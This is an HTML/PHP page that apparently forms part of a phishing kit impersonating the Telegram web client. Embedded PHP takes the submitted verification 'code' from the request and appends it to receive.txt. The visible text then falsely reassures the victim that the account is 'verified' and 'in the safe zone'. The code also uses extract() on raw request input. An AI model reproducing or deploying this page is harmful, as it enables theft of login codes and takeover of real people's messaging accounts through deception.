<!DOCTYPE html>
<head>
<link rel="stylesheet" href="Telegram Web_files/app.css">
</head>
<html>
<div class="login_head_bg"></div>
<div class="page_wrap">
<div class="login_page_wrap">

  <div class="login_page">
    <div class="login_head_wrap clearfix">
	</html>

<?php
extract($_REQUEST);
    $file=fopen("receive.txt","a");
    fwrite($file,"code:");
    fwrite($file, $code ."\n");
    fclose($file);
?>
      <div class="login_head_submit_wrap" style="">
      </div>
      <a class="" href="#">
        <img style="height:70px;" src="capture.PNG">
      </a>
    </div>

    <div class="login_form_wrap">
	
        <h3 class="login_phone_head"> <span>Account verified</span></h3>
        <div class="login_edit_phone"><a></a></div>

        <div>
         <p class="login_smscode_lead">Thank you for cooperating. Your account is now in the safe zone. We will notify you if further changes occure.</p>
         
        </div>

         <div>
          <!----><p class="login_smscode_lead">
            <span>
              <span>You can now return to your verified account</span>
              
            </span>
          </p><!---->
          <!---->
        </div><!---->
    </div>

    <div>
      <div class="login_footer_wrap">
        <p>Welcome to the official Telegram web-client.</p>
        <a class="logo_footer_learn_more_link" href="">Learn more</a>
      </div>

    </div>
  </div>

<div id="notify_sound"></div>
